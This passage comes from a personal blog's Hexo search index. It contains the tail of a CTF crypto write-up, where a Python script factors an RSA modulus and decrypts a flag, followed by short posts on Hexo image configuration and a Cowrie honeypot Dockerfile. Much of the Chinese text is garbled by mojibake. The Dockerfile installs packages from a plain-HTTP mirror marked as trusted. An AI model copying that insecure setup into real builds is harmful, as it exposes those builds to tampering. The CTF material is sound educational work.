class="string">&#x27;&#x27;</span>.join(p1)+<span class="string">&#x27;&#x27;</span>.join(p2),<span class="number">2</span>)   </span><br><span class="line">                    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">                        q=n//p</span><br><span class="line">                        <span class="keyword">if</span> p.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> n.bit_length() == <span class="number">4096</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;Get p q!\n&quot;</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;bad format2!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;phi_n:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(phi_n)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D0g3&#123;sYuWzkFk12A1gcWxG9pymFcjJL7CqN4Cq8PAIACObJ&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>my-first-blog</title>
    <url>/2024/01/03/my-first-blog/</url>
    <content><![CDATA[<h2 id="My-First-Blog"><a href="#My-First-Blog" class="headerlink" title="My First Blog"></a>My First Blog</h2><p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢ï¼Œè®°å½•ä¸€ä¸‹ä½¿ç”¨hexo+githubpagesæ­å»ºä¸ªäººç½‘ç«™æ—¶æœ‰ç”¨çš„å‚è€ƒé“¾æ¥~ b(ï¿£â–½ï¿£)d</p>
<span id="more"></span>

<h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><ul>
<li><a href="https://www.cnblogs.com/huanhao/p/hexobase.html">ã€åŸºç¡€ç¯‡ã€‘hexoåšå®¢æ­å»ºæ•™ç¨‹ - huanhao - åšå®¢å›­</a></li>
<li><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next ä¸»é¢˜åšå®¢ä¸ªæ€§åŒ–é…ç½®è¶…è¯¦ç»†ï¼Œè¶…å…¨é¢(ä¸¤ä¸‡å­—)_hexo next è®°å½•è®¿é—®äº†ip-CSDNåšå®¢</a></li>
<li><a href="https://oytoyt.github.io/2018/12/06/hexo%E5%BC%80%E5%90%AFtags%E6%88%96categories%E5%85%B6%E5%AE%83%E8%8F%9C%E5%8D%95%E6%97%B6%EF%BC%8C%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E9%97%AE%E9%A2%98/">hexoå¼€å¯tagsæˆ–categorieså…¶å®ƒèœå•æ—¶ï¼Œæ— æ³•è®¿é—®é—®é¢˜ | Yanting Ou</a></li>
</ul>
<h2 id="TODOï¼š"><a href="#TODOï¼š" class="headerlink" title="TODOï¼š"></a>TODOï¼š</h2><ul>
<li><input checked disabled type="checkbox"> hexoåšæ–‡ä¸­æ·»åŠ å›¾ç‰‡ï¼Œä¿®æ”¹hexo-asset-imageæ’ä»¶é…ç½®</li>
<li><input disabled type="checkbox"> sqlæ³¨å…¥ç¬”è®°æ•´ç†</li>
<li><input disabled type="checkbox"> runnerç›¸å…³ç¬”è®°æ•´ç†</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>ä½¿ç”¨hexo-asset-imageåœ¨hexoåšå®¢ä¸­æ’å…¥å›¾ç‰‡</title>
    <url>/2024/01/21/%E4%BD%BF%E7%94%A8hexo-asset-image%E5%9C%A8hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="ä»€ä¹ˆæ˜¯hexo-asset-imageï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯hexo-asset-imageï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯hexo-asset-imageï¼Ÿ"></a>ä»€ä¹ˆæ˜¯hexo-asset-imageï¼Ÿ</h2><ul>
<li>Give asset image in hexo a absolutely path automatically.</li>
<li><a href="https://github.com/CodeFalling/hexo-asset-image">CodeFalling&#x2F;hexo-asset-image</a></li>
</ul>
<h2 id="å®‰è£…hexo-asset-image"><a href="#å®‰è£…hexo-asset-image" class="headerlink" title="å®‰è£…hexo-asset-image"></a>å®‰è£…hexo-asset-image</h2><ul>
<li><code>npm install hexo-asset-image --save</code></li>
</ul>
<h2 id="ä¿®æ”¹hexoé…ç½®"><a href="#ä¿®æ”¹hexoé…ç½®" class="headerlink" title="ä¿®æ”¹hexoé…ç½®"></a>ä¿®æ”¹hexoé…ç½®</h2><ul>
<li><p>ä¿®æ”¹hexoæ ¹ç›®å½•ä¸‹çš„<code>_config.yml</code>æ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="ä¿®æ”¹hexo-asset-imageæ’ä»¶"><a href="#ä¿®æ”¹hexo-asset-imageæ’ä»¶" class="headerlink" title="ä¿®æ”¹hexo-asset-imageæ’ä»¶"></a>ä¿®æ”¹hexo-asset-imageæ’ä»¶</h2><ul>
<li>ä¿®æ”¹<code>node_modules\hexo-asset-image\index.js</code>ï¼š<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ³¨é‡Šæ‰ä»¥ä¸‹ä»£ç </span></span><br><span class="line"><span class="comment">// if(srcArray.length &gt; 1)</span></span><br><span class="line"><span class="comment">// srcArray.shift();</span></span><br><span class="line"><span class="comment">// src = srcArray.join(&#x27;/&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $(this).attr(&#x27;src&#x27;, config.root + link + src);</span></span><br><span class="line"><span class="comment">// console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ ä»¥ä¸‹ä»£ç </span></span><br><span class="line">$(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, src);</span><br><span class="line"><span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;update link as:--&gt;&quot;</span>+src);</span><br></pre></td></tr></table></figure></li>
<li>ä¿®æ”¹åçš„<code>index.js</code>æ–‡ä»¶å¦‚ä¸‹ï¼š<br><img src="/2024/01/21/%E4%BD%BF%E7%94%A8hexo-asset-image%E5%9C%A8hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/%E4%BF%AE%E6%94%B9hexo-asset-image%E7%9A%84index%E6%96%87%E4%BB%B6.jpg"></li>
</ul>
<h2 id="ä½¿ç”¨hexo-asset-imageæ’å…¥å›¾ç‰‡"><a href="#ä½¿ç”¨hexo-asset-imageæ’å…¥å›¾ç‰‡" class="headerlink" title="ä½¿ç”¨hexo-asset-imageæ’å…¥å›¾ç‰‡"></a>ä½¿ç”¨hexo-asset-imageæ’å…¥å›¾ç‰‡</h2><ul>
<li>åˆ›å»ºæ–°çš„æ–‡ç« ï¼Œä¾‹å¦‚<code>hexo new &quot;xx&quot;</code>ï¼Œä¼šåœ¨<code>source/_posts</code>ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªmdæ–‡ä»¶ä»¥åŠåŒåæ–‡ä»¶å¤¹</li>
<li>ç¤ºä¾‹:  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MacGesture2-Publish</span><br><span class="line">â”œâ”€â”€ apppicker.jpg</span><br><span class="line">â”œâ”€â”€ logo.jpg</span><br><span class="line">â””â”€â”€ rules.jpg</span><br><span class="line">MacGesture2-Publish.md</span><br></pre></td></tr></table></figure></li>
<li>åœ¨mdæ–‡ä»¶ä¸­æ’å…¥å›¾ç‰‡ï¼Œä¾‹å¦‚ï¼š<code>![](appicker.jpg)</code>ï¼Œå›¾ç‰‡åç§°å°±æ˜¯å›¾ç‰‡è·¯å¾„</li>
</ul>
]]></content>
      <categories>
        <category>æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸºäºCowrieèœœç½éƒ¨ç½²æ•™ç¨‹æ„å»ºdockeré•œåƒ</title>
    <url>/2024/02/04/%E5%9F%BA%E4%BA%8ECowrie%E8%9C%9C%E7%BD%90%E9%83%A8%E7%BD%B2%E6%95%99%E7%A8%8B%E6%9E%84%E5%BB%BAdocker%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>åœ¨ä½¿ç”¨cowrieå®˜ç½‘çš„é•œåƒæ­å»ºèœœç½æ—¶ï¼Œæ— æ³•è®¿é—®èœœç½å®¹å™¨é‡Œçš„æ—¥å¿—æ–‡ä»¶ï¼Œæ‰€ä»¥å†³å®šè‡ªå·±æ„å»ºä¸€ä¸ªé•œåƒï¼Œæ–¹ä¾¿åç»­çš„æ“ä½œã€‚</p>
<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸºäºubuntu22.04æ„å»º</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:jammy</span><br><span class="line"></span><br><span class="line"><span class="comment"># ï¼ˆrootæƒé™ä¸‹ï¼‰æ¢æºå¹¶å®‰è£…å¿…è¦çš„åŒ…ï¼Œå¦åˆ™å®‰è£…è½¯ä»¶åŒ…ä¼šå¾ˆæ…¢ï¼Œç”šè‡³è¶…æ—¶æŠ¥é”™</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">test</span> ! -f /etc/apt/source.list.save &amp;&amp; <span class="built_in">cp</span>  /etc/apt/sources.list /etc/apt/sources.list.save \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&quot;s@security.ubuntu.com@mirrors.ustc.edu.cn@g&quot;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&quot;s@archive.ubuntu.com@mirrors.ustc.edu.cn@g&quot;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y wget python3.10-venv python-is-python3 git python3-virtualenv libssl-dev libffi-dev build-essential libpython3-dev python3-minimal authbind virtualenv \ </span></span><br><span class="line">    &amp;&amp; adduser --disabled-password --gecos <span class="string">&quot;&quot;</span> cowrie</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸºäºcowrieå®˜ç½‘çš„å®‰è£…æ•™ç¨‹ï¼Œåœ¨ubuntuä¸Šå®‰è£…cowrie</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> su - cowrie \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">cd</span> /home/cowrie \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; wget https://github.com/cowrie/cowrie/archive/refs/tags/v2.5.0.tar.gz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; tar -zxvf v2.5.0.tar.gz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mv</span> cowrie-2.5.0/ cowrie \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">cd</span> cowrie \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">pwd</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; python -m venv cowrie-env \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; . cowrie-env/bin/activate \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; python -m pip install --upgrade pip -i http://pypi.douban.com/simple --trusted-host pypi.douban.com \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; python -m pip install --upgrade -r requirements.txt -i http://pypi.douban.com/simple --trusted-host pypi.douban.com \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chown</span> -R cowrie:cowrie .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æš´éœ²ç«¯å£</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">2222</span> <span class="number">2223</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å®¹å™¨çš„é»˜è®¤ç”¨æˆ·å’Œå·¥ä½œç›®å½•</span></span><br><span class="line"><span class="keyword">USER</span> cowrie</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/cowrie/cowrie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨èœœç½å‘½ä»¤</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;bin/cowrie&quot;</span>, <span class="string">&quot;start&quot;</span>,<span class="string">&quot;-n&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<h2 id="æ„å»ºé•œåƒ"><a href="#æ„å»ºé•œåƒ" class="headerlink" title="æ„å»ºé•œåƒ"></a>æ„å»ºé•œåƒ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t cowrie_from_ubuntu:20240202 .</span><br></pre></td></tr></table></figure>

<h2 id="è¿è¡Œæ–¹å¼"><a href="#è¿è¡Œæ–¹å¼" class="headerlink" title="è¿è¡Œæ–¹å¼"></a>è¿è¡Œæ–¹å¼</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 2222:2222 -p 2223:2223 cowrie_from_ubuntu:20240202</span><br></pre></td></tr></table></figure>

<h2 id="ä¸Šä¼ é•œåƒ"><a href="#ä¸Šä¼ é•œåƒ" class="headerlink" title="ä¸Šä¼ é•œåƒ"></a>ä¸Šä¼ é•œåƒ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç™»å½•åˆ°Docker Hub</span></span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºé•œåƒæ·»åŠ æ ‡ç­¾</span></span><br><span class="line">docker tag cowrie_from_ubuntu:20240202 mollyyuu/cowrie_from_ubuntu:20240202</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†é•œåƒæ¨é€åˆ°Docker Hub</span></span><br><span class="line">docker push mollyyuu/cowrie_from_ubuntu:20240202</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://cowrie.readthedocs.io/en/latest/INSTALL.html">Installing Cowrie in seven steps â€” cowrie 2.5.0 documentation</a></li>
<li><a href="https://www.cnblogs.com/jingjingxyk/p/16825510.html">alpineã€debianã€ubuntu brew å¸¸ç”¨çš„æ¢æºå‘½ä»¤ - jingjingxyk - åšå®¢å›­</a></li>
</ul>
]]></content>
      <categories>
        <category>honeypot</category>
      </categories>
      <tags>
        <tag>cowrie</tag>
        <tag>Dockerfile</tag>
      </tags>
  </entry>
</search>
